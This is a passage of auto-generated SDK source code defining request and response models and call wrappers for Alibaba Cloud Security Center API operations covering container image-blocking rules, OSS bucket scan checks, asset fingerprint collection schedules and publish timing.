  var params = new OpenApi.Params{
    action = 'GetOpaClusterImageList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary 查询集群镜像
 *
 * @param request GetOpaClusterImageListRequest
 * @return GetOpaClusterImageListResponse
 */
async function getOpaClusterImageList(request: GetOpaClusterImageListRequest): GetOpaClusterImageListResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOpaClusterImageListWithOptions(request, runtime);
}

model GetOpaClusterLabelListRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster to which the container belongs.

>  You can call the [DescribeGroupedContainerInstances](https://help.aliyun.com/document_detail/182997.html) operation to query the IDs of clusters.', example='c556c8133b5ad4378b7fc533ddbda****'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: 200. If you leave the PageSize parameter empty, 200 entries are returned by default. Maximum value: 200.

>  We recommend that you do not leave this parameter empty.', example='20'),
  tagName?: string(name='TagName', description='The name of the tag.', example='test'),
}

model GetOpaClusterLabelListResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='2'),
  data?: [ 
    {
      tagName?: string(name='TagName', description='The name of the tag that is added to the container.', example='test'),
    }
  ](name='Data', description='The information about the tags that are added to containers.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='95D35EB3-1F8E-5E07-A68E-BE018C9B80CB'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaClusterLabelListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOpaClusterLabelListResponseBody(name='body'),
}

/**
 * @summary Queries information about the tags that are added to containers based on the feature of proactive defense for containers.
 *
 * @param request GetOpaClusterLabelListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOpaClusterLabelListResponse
 */
async function getOpaClusterLabelListWithOptions(request: GetOpaClusterLabelListRequest, runtime: Util.RuntimeOptions): GetOpaClusterLabelListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.tagName)) {
    query['TagName'] = request.tagName;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOpaClusterLabelList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about the tags that are added to containers based on the feature of proactive defense for containers.
 *
 * @param request GetOpaClusterLabelListRequest
 * @return GetOpaClusterLabelListResponse
 */
async function getOpaClusterLabelList(request: GetOpaClusterLabelListRequest): GetOpaClusterLabelListResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOpaClusterLabelListWithOptions(request, runtime);
}

model GetOpaClusterNamespaceListRequest {
  clusterId?: string(name='ClusterId', description='The ID of the cluster that you want to query.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.', example='ca0faf43e33904ecbb6c695df7906****'),
  currentPage?: int32(name='CurrentPage', description='The page number.', example='1'),
  nameSpaceName?: string(name='NameSpaceName', description='The name of the namespace.', example='sit'),
  pageSize?: int32(name='PageSize', description='The number of entries per page. Default value: **20**.', example='20'),
}

model GetOpaClusterNamespaceListResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  count?: int32(name='Count', description='The number of entries returned on the current page.', example='0'),
  data?: [ 
    {
      nameSpaceName?: string(name='NameSpaceName', description='The name of the namespace.', example='testNameSpace'),
    }
  ](name='Data', description='The namespaces.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='384BFAF1-FC41-58DD-97DD-9D361ADF377D'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaClusterNamespaceListResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOpaClusterNamespaceListResponseBody(name='body'),
}

/**
 * @summary Queries information about the namespaces of clusters for which the rules of the at-risk image blocking type are configured in proactive defense for containers.
 *
 * @param request GetOpaClusterNamespaceListRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOpaClusterNamespaceListResponse
 */
async function getOpaClusterNamespaceListWithOptions(request: GetOpaClusterNamespaceListRequest, runtime: Util.RuntimeOptions): GetOpaClusterNamespaceListResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.nameSpaceName)) {
    query['NameSpaceName'] = request.nameSpaceName;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOpaClusterNamespaceList',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries information about the namespaces of clusters for which the rules of the at-risk image blocking type are configured in proactive defense for containers.
 *
 * @param request GetOpaClusterNamespaceListRequest
 * @return GetOpaClusterNamespaceListResponse
 */
async function getOpaClusterNamespaceList(request: GetOpaClusterNamespaceListRequest): GetOpaClusterNamespaceListResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOpaClusterNamespaceListWithOptions(request, runtime);
}

model GetOpaPluginStatusRequest {
  clusterIds?: [ string ](name='ClusterIds', description='The cluster IDs.

>  You can call the [DescribeGroupedContainerInstances](~~DescribeGroupedContainerInstances~~) operation to query the IDs of clusters.

This parameter is required.'),
}

model GetOpaPluginStatusResponseBody = {
  installStatus?: [ 
    {
      clusterId?: string(name='ClusterId', description='The cluster ID.', example='c60b77fe62093480db6164a3c2fa****'),
      installStatus?: boolean(name='InstallStatus', description='Indicates whether the component is installed. Valid values:

*   **true**
*   **false**', example='true'),
    }
  ](name='InstallStatus', description='The installation status of the components that are required for clusters protected by proactive defense for containers.'),
  requestId?: string(name='RequestId', description='The request ID.', example='09969D2C-4FAD-429E-BFBF-9A60DEF8BF6F'),
}

model GetOpaPluginStatusResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOpaPluginStatusResponseBody(name='body'),
}

/**
 * @summary Queries the installation status of the components that are required for clusters protected by proactive defense for containers.
 *
 * @param request GetOpaPluginStatusRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOpaPluginStatusResponse
 */
async function getOpaPluginStatusWithOptions(request: GetOpaPluginStatusRequest, runtime: Util.RuntimeOptions): GetOpaPluginStatusResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.clusterIds)) {
    query['ClusterIds'] = request.clusterIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOpaPluginStatus',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the installation status of the components that are required for clusters protected by proactive defense for containers.
 *
 * @param request GetOpaPluginStatusRequest
 * @return GetOpaPluginStatusResponse
 */
async function getOpaPluginStatus(request: GetOpaPluginStatusRequest): GetOpaPluginStatusResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOpaPluginStatusWithOptions(request, runtime);
}

model GetOpaStrategyDetailNewRequest {
  strategyId?: long(name='StrategyId', description='The rule ID.

>  You can call the [ListOpaClusterStrategyNew](https://help.aliyun.com/document_detail/2623574.html) operation to query the rule ID.', example='1349'),
}

model GetOpaStrategyDetailNewResponseBody = {
  code?: string(name='Code', description='The status code returned. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: {
    alarmDetail?: {
      baseline?: {
        item?: [ 
          {
            id?: string(name='Id', description='The ID of the baseline check item.', example='ak_leak'),
            name?: string(name='Name', description='The name of the baseline check item.', example='Access Key plaintext storage'),
          }
        ](name='Item', description='The information about the baseline check item.'),
        riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
      }(name='Baseline', description='The baseline check configuration.'),
      buildRisk?: {
        item?: [ 
          {
            id?: string(name='Id', description='The ID of the image build risk.

>  You can call the [ListImageBuildRiskItem](~~ListImageBuildRiskItem~~) operation to query the ID of the malicious sample.', example='key'),
            name?: string(name='Name', description='The name of the image build risk.

>  You can call the [ListImageBuildRiskItem](~~ListImageBuildRiskItem~~) operation to query the ID of the malicious sample.', example='name'),
          }
        ](name='Item', description='The configuration of image build risk.'),
        riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
      }(name='BuildRisk', description='The configuration of image build risk.'),
      maliciousFile?: {
        item?: [ 
          {
            id?: string(name='Id', description='The ID of the malicious sample.', example='1811'),
            name?: string(name='Name', description='The name of the malicious sample.', example='abnormal binary file'),
          }
        ](name='Item', description='The information about the malicious sample.'),
        riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
      }(name='MaliciousFile', description='The configuration of malicious samples.'),
      sensitiveFile?: {
        item?: [ 
          {
            id?: string(name='Id', description='The ID of the sensitive files.

>  You can call the [GetSensitiveDefineRuleConfig](~~GetSensitiveDefineRuleConfig~~) operation to query the ID of the malicious sample.', example='key'),
            name?: string(name='Name', description='The name of the sensitive files.

>  You can call the [GetSensitiveDefineRuleConfig](~~GetSensitiveDefineRuleConfig~~) operation to query the ID of the malicious sample.', example='name'),
          }
        ](name='Item', description='The configuration of sensitive file.'),
        riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
      }(name='SensitiveFile', description='The configuration of sensitive file.'),
      vul?: {
        item?: [ 
          {
            id?: string(name='Id', description='The ID of the vulnerability.', example='AVD-2023-1680169'),
            name?: string(name='Name', description='The name of the vulnerability.', example='ezOffice evoInterfaceServlet Info Leak'),
          }
        ](name='Item', description='The information about the vulnerability.'),
        riskClass?: [ 
          {
            id?: string(name='Id', description='The ID of the vulnerability types. Valid values:

*   **cve**: system vulnerability
*   **app**: application vulnerability', example='cve'),
            name?: string(name='Name', description='The name of the vulnerability. Valid values:

*   **system vulnerability**
*   **application vulnerability**', example='system vulnerability'),
          }
        ](name='RiskClass', description='Risk type of vulnerability.'),
        riskLevel?: [ string ](name='RiskLevel', description='The risk levels.'),
      }(name='Vul', description='The vulnerability configuration.'),
    }(name='AlarmDetail', description='The rule configuration.'),
    clusterId?: string(name='ClusterId', description='The cluster ID.', example='c8ca91e0907d94efaba7fb0827eb9****'),
    clusterName?: string(name='ClusterName', description='The cluster name.', example='test'),
    currentPage?: int32(name='CurrentPage', description='The page number. Default value: **1**. Pages start from page 1.', example='4'),
    description?: string(name='Description', description='The description.', example='Custom defense configuration'),
    imageName?: [ string ](name='ImageName', description='The image names.'),
    label?: [ string ](name='Label', description='The image tags.'),
    lang?: string(name='Lang', description='The language of the content within the request and response. Default value: **zh**. Valid values:

*   **zh**: Chinese
*   **en**: English', example='zh'),
    maliciousImage?: boolean(name='MaliciousImage', description='Indicates whether the rule supports malicious Internet images. Valid values:

*   **true**
*   **false**', example='true'),
    pageSize?: int32(name='PageSize', description='The number of entries per page.', example='20'),
    ruleAction?: int32(name='RuleAction', description='The action that is performed when the rule is hit. Valid values:

*   **1**: trigger alerts
*   **2**: block
*   **3**: allow', example='1'),
    scopes?: [ 
      {
        ackPolicyInstanceId?: string(name='AckPolicyInstanceId', description='The rule instance ID of the cluster.', example='ack-0'),
        allNamespace?: int32(name='AllNamespace', description='Indicates whether all namespaces are included. Valid values:

*   **1**: yes
*   **0**: no', example='1'),
        clusterId?: string(name='ClusterId', description='The cluster ID.', example='c1fdb5fd8d**7163'),
        namespaceList?: [ string ](name='NamespaceList', description='The namespaces.'),
      }
    ](name='Scopes', description='The application scope.'),
    strategyId?: long(name='StrategyId', description='The rule ID.', example='1005'),
    strategyName?: string(name='StrategyName', description='The rule name.', example='test001'),
    strategyTemplateId?: long(name='StrategyTemplateId', description='The ID of the rule template.', example='1204'),
    unScanedImage?: boolean(name='UnScanedImage', description='Indicates whether the rule supports unscanned images. Valid values:

*   **true**
*   **false**', example='true'),
    whiteList?: [ string ](name='WhiteList', description='The image tags that are added to the whitelist.'),
  }(name='Data', description='The data returned.'),
  httpStatusCode?: int32(name='HttpStatusCode', description='The HTTP status code that is returned.', example='200'),
  message?: string(name='Message', description='The returned message.', example='success'),
  requestId?: string(name='RequestId', description='The request ID.', example='E819FD71-D240-5E54-AA7F-20FED2ECBEB6'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaStrategyDetailNewResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOpaStrategyDetailNewResponseBody(name='body'),
}

/**
 * @summary Queries the details of the rule that is used to block at-risk images.
 *
 * @param request GetOpaStrategyDetailNewRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOpaStrategyDetailNewResponse
 */
async function getOpaStrategyDetailNewWithOptions(request: GetOpaStrategyDetailNewRequest, runtime: Util.RuntimeOptions): GetOpaStrategyDetailNewResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOpaStrategyDetailNew',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the details of the rule that is used to block at-risk images.
 *
 * @param request GetOpaStrategyDetailNewRequest
 * @return GetOpaStrategyDetailNewResponse
 */
async function getOpaStrategyDetailNew(request: GetOpaStrategyDetailNewRequest): GetOpaStrategyDetailNewResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOpaStrategyDetailNewWithOptions(request, runtime);
}

model GetOpaStrategyTemplateSummaryResponseBody = {
  code?: string(name='Code', description='The response code. The status code **200** indicates that the request was successful. Other status codes indicate that the request failed. You can identify the cause of the failure based on the status code.', example='200'),
  data?: [ 
    {
      count?: int32(name='Count', description='The number of times that the template is used.', example='2'),
      description?: string(name='Description', description='The description of the template.', example='Custom defense configuration'),
      templateId?: long(name='TemplateId', description='The ID of the template.', example='1'),
      templateName?: string(name='TemplateName', description='The name of the template.', example='Blank template'),
    }
  ](name='Data', description='The usage statistics about the templates provided for rules of the at-risk image blocking type.'),
  message?: string(name='Message', description='The returned message.', example='successful'),
  requestId?: string(name='RequestId', description='The request ID.', example='54572138-3390-5774-B71D-799DC8C2161B'),
  success?: boolean(name='Success', description='Indicates whether the request was successful. Valid values:

*   **true**
*   **false**', example='true'),
}

model GetOpaStrategyTemplateSummaryResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOpaStrategyTemplateSummaryResponseBody(name='body'),
}

/**
 * @summary Queries the usage statistics about the templates provided in the feature of proactive defense for containers for rules of the at-risk image blocking type.
 *
 * @param request GetOpaStrategyTemplateSummaryRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOpaStrategyTemplateSummaryResponse
 */
async function getOpaStrategyTemplateSummaryWithOptions(runtime: Util.RuntimeOptions): GetOpaStrategyTemplateSummaryResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetOpaStrategyTemplateSummary',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the usage statistics about the templates provided in the feature of proactive defense for containers for rules of the at-risk image blocking type.
 *
 * @return GetOpaStrategyTemplateSummaryResponse
 */
async function getOpaStrategyTemplateSummary(): GetOpaStrategyTemplateSummaryResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOpaStrategyTemplateSummaryWithOptions(runtime);
}

model GetOssBucketScanStatisticRequest {
  bucketNameList?: [ string ](name='BucketNameList', description='The names of the buckets.'),
  source?: string(name='Source', description='The data source. Valid values:

*   **API**: API operations.
*   **OSS**: Object Storage Service (OSS) file check.', example='API'),
}

model GetOssBucketScanStatisticResponseBody = {
  data?: {
    expireTime?: long(name='ExpireTime', description='The expiration time of the purchased quota.', example='1714442403000'),
    highRisk?: long(name='HighRisk', description='The number of high-risk objects.', example='0'),
    lowRisk?: long(name='LowRisk', description='The number of low-risk objects.', example='0'),
    mediumRisk?: long(name='MediumRisk', description='The number of medium-risk objects.', example='0'),
    noScanBucket?: int32(name='NoScanBucket', description='The number of buckets that are not checked.', example='1'),
    remainAuth?: int32(name='RemainAuth', description='The remaining quota.', example='1'),
    riskBucket?: int32(name='RiskBucket', description='The number of buckets in which at-risk objects exist.', example='1'),
    scanObject?: long(name='ScanObject', description='The number of objects that are checked.', example='1'),
    totalBucket?: int32(name='TotalBucket', description='The total number of buckets.', example='1'),
    totalObject?: long(name='TotalObject', description='The total number of objects in the bucket.', example='1'),
  }(name='Data', description='The response parameters.'),
  requestId?: string(name='RequestId', description='The request ID.', example='FAC50208-E56B-5CC8-8738-2B219D1A****'),
}

model GetOssBucketScanStatisticResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOssBucketScanStatisticResponseBody(name='body'),
}

/**
 * @summary Queries the statistics about an Object Storage Service (OSS) bucket check.
 *
 * @param request GetOssBucketScanStatisticRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOssBucketScanStatisticResponse
 */
async function getOssBucketScanStatisticWithOptions(request: GetOssBucketScanStatisticRequest, runtime: Util.RuntimeOptions): GetOssBucketScanStatisticResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bucketNameList)) {
    query['BucketNameList'] = request.bucketNameList;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOssBucketScanStatistic',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the statistics about an Object Storage Service (OSS) bucket check.
 *
 * @param request GetOssBucketScanStatisticRequest
 * @return GetOssBucketScanStatisticResponse
 */
async function getOssBucketScanStatistic(request: GetOssBucketScanStatisticRequest): GetOssBucketScanStatisticResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOssBucketScanStatisticWithOptions(request, runtime);
}

model GetOssScanConfigRequest {
  bucketName?: string(name='BucketName', description='The name of the bucket.', example='iboxpublic****'),
  id?: string(name='Id', description='The policy ID.', example='1'),
}

model GetOssScanConfigResponseBody = {
  data?: {
    allKeyPrefix?: boolean(name='AllKeyPrefix', description='Indicates whether the prefixes of all objects are matched.', example='true'),
    bucketCount?: int32(name='BucketCount', description='The number of buckets.', example='1'),
    bucketName?: string(name='BucketName', description='The name of the bucket.', example='hz-new01****'),
    bucketNameList?: [ string ](name='BucketNameList', description='The names of the buckets.'),
    decompressMaxFileCount?: int32(name='DecompressMaxFileCount', description='The maximum number of objects that can be extracted during decompression. Valid values: 1 to 1000. If the maximum number of objects that can be extracted is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='100'),
    decompressMaxLayer?: int32(name='DecompressMaxLayer', description='The maximum number of decompression levels when multi-level packages are decompressed. Valid values: 1 to 5. If the maximum number of decompression levels is reached, the decompression operation immediately ends and the detection of extracted objects is not affected.', example='1'),
    decryptionList?: [ string ](name='DecryptionList', description='The decryption methods.'),
    enable?: int32(name='Enable', description='Indicates whether the check policy is enabled. Valid values:

*   **1**: enabled.
*   **0**: disabled.', example='1'),
    endTime?: string(name='EndTime', description='The end time of the check. The time is in the HH:mm:ss format.', example='00:00:00'),
    id?: string(name='Id', description='The policy ID.', example='1274****'),
    keyPrefixList?: [ string ](name='KeyPrefixList', description='The prefixes of the objects.'),
    keySuffixList?: [ string ](name='KeySuffixList', description='The suffixes of the objects that are checked.'),
    lastModifiedStartTime?: long(name='LastModifiedStartTime', description='The timestamp when the object was last modified. The time must be later than the timestamp that you specify. Unit: milliseconds.', example='1724301769834'),
    lastUpdateTime?: long(name='LastUpdateTime', description='The timestamp when the configuration was last modified.', example='1702025633079'),
    name?: string(name='Name', description='The policy name.', example='test0104'),
    scanDayList?: [ int32 ](name='ScanDayList', description='The days when the check is performed. The value indicates the days of the week.'),
    startTime?: string(name='StartTime', description='The start time of the check. The time is in the HH:mm:ss format.', example='00:00:00'),
  }(name='Data', description='The data returned.'),
  requestId?: string(name='RequestId', description='The request ID.', example='E10BAF1C-A6C5-51E2-866C-76D5922E****'),
}

model GetOssScanConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetOssScanConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations of an Object Storage Service (OSS) bucket check policy.
 *
 * @param request GetOssScanConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetOssScanConfigResponse
 */
async function getOssScanConfigWithOptions(request: GetOssScanConfigRequest, runtime: Util.RuntimeOptions): GetOssScanConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bucketName)) {
    query['BucketName'] = request.bucketName;
  }
  if (!Util.isUnset(request.id)) {
    query['Id'] = request.id;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetOssScanConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations of an Object Storage Service (OSS) bucket check policy.
 *
 * @param request GetOssScanConfigRequest
 * @return GetOssScanConfigResponse
 */
async function getOssScanConfig(request: GetOssScanConfigRequest): GetOssScanConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getOssScanConfigWithOptions(request, runtime);
}

model GetPropertyScheduleConfigRequest {
  type?: string(name='Type', description='The type of the asset fingerprints. Valid values:

*   **scheduler_port_period**: listening port
*   **scheduler_process_period**: running process
*   **scheduler_account_period**: account
*   **scheduler_software_period**: software
*   **scheduler_cron_period**: scheduled task
*   **scheduler_sca_period**: middleware
*   **scheduler_autorun_period**: startup item
*   **scheduler_lkm_period**: kernel module
*   **scheduler_sca_proxy_period**: website', example='scheduler_sca_period'),
  uuid?: string(name='Uuid', description='The UUID of the server.

>  You can call the [DescribeCloudCenterInstances](~~DescribeCloudCenterInstances~~) operation to query the UUIDs of servers.', example='50d213b4-3a35-427a-b8a5-04b0c7e1****'),
}

model GetPropertyScheduleConfigResponseBody = {
  propertyScheduleConfig?: {
    nextScheduleTime?: long(name='NextScheduleTime', description='The timestamp when the next collection of asset fingerprints starts. Unit: milliseconds.', example='1671630647018'),
    scheduleTime?: string(name='ScheduleTime', description='The collection frequency of asset fingerprints. Valid values:

*   **0**: disabled, which indicates that the asset fingerprints are not automatically or periodically collected.
*   **1**: collects asset fingerprints once an hour.
*   **3**: collects asset fingerprints once every 3 hours.
*   **12**: collects asset fingerprints once every 12 hours.
*   **24**: collects asset fingerprints once a day.
*   **168**: collects asset fingerprints once every 7 days.', example='3'),
    type?: string(name='Type', description='The type of the asset fingerprints. Valid values:

*   **scheduler_port_period**: listening port
*   **scheduler_process_period**: running process
*   **scheduler_account_period**: account
*   **scheduler_software_period**: software
*   **scheduler_cron_period**: scheduled task
*   **scheduler_sca_period**: middleware
*   **scheduler_autorun_period**: startup item
*   **scheduler_lkm_period**: kernel module
*   **scheduler_sca_proxy_period**: website', example='scheduler_account_period'),
  }(name='PropertyScheduleConfig', description='The configurations for the collection frequency of asset fingerprints.'),
  requestId?: string(name='RequestId', description='The ID of the request, which is used to locate and troubleshoot issues.', example='B37C9052-A73E-4707-A024-92477028****'),
}

model GetPropertyScheduleConfigResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetPropertyScheduleConfigResponseBody(name='body'),
}

/**
 * @summary Queries the configurations for the collection frequency of asset fingerprints.
 *
 * @param request GetPropertyScheduleConfigRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetPropertyScheduleConfigResponse
 */
async function getPropertyScheduleConfigWithOptions(request: GetPropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): GetPropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetPropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Queries the configurations for the collection frequency of asset fingerprints.
 *
 * @param request GetPropertyScheduleConfigRequest
 * @return GetPropertyScheduleConfigResponse
 */
async function getPropertyScheduleConfig(request: GetPropertyScheduleConfigRequest): GetPropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getPropertyScheduleConfigWithOptions(request, runtime);
}

model GetPublishCronResponseBody = {
  data?: {
    cron?: string(name='Cron', description='Cron expression for the start time of the upgrade.', example='0 0 7 * * ?'),
    cronDay?: string(name='CronDay', description='The day of the week for the upgrade. The values are as follows:
- **MON**: Monday
- **TUE**: Tuesday
- **WED**: Wednesday
- **THU**: Thursday
- **FRI**: Friday
- **SAT**: Saturday
- **SUN**: Sunday', example='MON'),
    cronTime?: long(name='CronTime', description='Timestamp for the start of the publish, in milliseconds.', example='1724522400000'),
    cronType?: string(name='CronType', description='Upgrade start cycle type. The values are as follows:
- **day**: Daily
- **week**: Weekly', example='day'),
    duration?: int32(name='Duration', description='Duration of the upgrade in hours.', example='24'),
  }(name='Data', description='Publish scheduling configuration information.'),
  requestId?: string(name='RequestId', description='The ID of this request, which is a unique identifier generated by Alibaba Cloud for the request and can be used to troubleshoot and locate issues.', example='30CBF632-109F-596F-97F2-451C8B2A****'),
}

model GetPublishCronResponse = {
  headers?: map[string]string(name='headers'),
  statusCode?: int32(name='statusCode'),
  body?: GetPublishCronResponseBody(name='body'),
}

/**
 * @summary Get Publish Time Configuration
 *
 * @param request GetPublishCronRequest
 * @param runtime runtime options for this request RuntimeOptions
 * @return GetPublishCronResponse
 */
async function getPublishCronWithOptions(runtime: Util.RuntimeOptions): GetPublishCronResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetPublishCron',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  if (Util.isUnset(@signatureVersion) || !Util.equalString(@signatureVersion, 'v4')) {
    return callApi(params, req, runtime);
  } else {
    return execute(params, req, runtime);
  }
}

/**
 * @summary Get Publish Time Configuration
